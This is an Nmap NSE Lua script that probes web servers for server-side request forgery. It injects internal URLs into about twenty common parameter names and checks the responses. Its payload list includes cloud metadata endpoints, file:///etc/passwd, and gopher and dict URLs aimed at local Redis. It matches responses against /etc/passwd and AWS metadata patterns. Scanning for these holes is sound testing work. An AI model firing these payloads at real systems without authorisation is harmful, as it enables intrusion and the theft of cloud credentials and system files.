local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"
local url = require "url"

description = [[
Tests for Server-Side Request Forgery (SSRF) vulnerabilities.
Injects internal URLs and checks for responses indicating successful SSRF.
]]

---
-- @usage
-- nmap --script http-ssrf -p 80,443 <target>
--
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | http-ssrf:
-- |   Potential SSRF vulnerability found:
-- |     Parameter: url
-- |     Test URL: http://127.0.0.1:80
-- |     Response indicates internal access
-- |_  Use --script-args http-ssrf.url=<url> to test specific endpoint

author = "Nemue Security"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "safe"}

portrule = shortport.http

local ssrf_payloads = {
  "http://127.0.0.1",
  "http://localhost",
  "http://[::1]",
  "http://0.0.0.0",
  "http://169.254.169.254",
  "http://metadata.google.internal",
  "http://169.254.169.254/latest/meta-data/",
  "file:///etc/passwd",
  "dict://127.0.0.1:6379",
  "gopher://127.0.0.1:6379"
}

local ssrf_params = {
  "url", "uri", "link", "src", "href", "dest", "redirect", "feed",
  "host", "site", "html", "page", "path", "continue", "return",
  "next", "url", "checkout_url", "return_url", "callback"
}

local function detect_ssrf(host, port, path, param, payload)
  local test_url = path .. "?" .. param .. "=" .. url.escape(payload)
  local response = http.get(host, port, test_url)

  if response and response.body then
    local body = response.body:lower()
    if body:match("root:x:0:0") or
       body:match("localhost") or
       body:match("127%.0%.0%.1") or
       body:match("metadata") or
       body:match("ami%-id") then
      return true, response.body
    end
  end
  return false, nil
end

action = function(host, port)
  local path = stdnse.get_script_args(SCRIPT_NAME .. ".url") or "/"
  local output = {}
  local vuln_count = 0

  for _, param in ipairs(ssrf_params) do
    for _, payload in ipairs(ssrf_payloads) do
      local vulnerable, response_body = detect_ssrf(host, port, path, param, payload)

      if vulnerable then
        vuln_count = vuln_count + 1
        table.insert(output, string.format("Parameter: %s", param))
        table.insert(output, string.format("Test URL: %s", payload))
        table.insert(output, "Response indicates internal access")
        table.insert(output, "")
      end
    end
  end

  if #output > 0 then
    local result = {}
    table.insert(result, "Potential SSRF Vulnerabilities Found:")
    table.insert(result, "")
    for _, line in ipairs(output) do
      table.insert(result, line)
    end
    return table.concat(result, "\n")
  end

  return "No SSRF vulnerabilities detected"
end
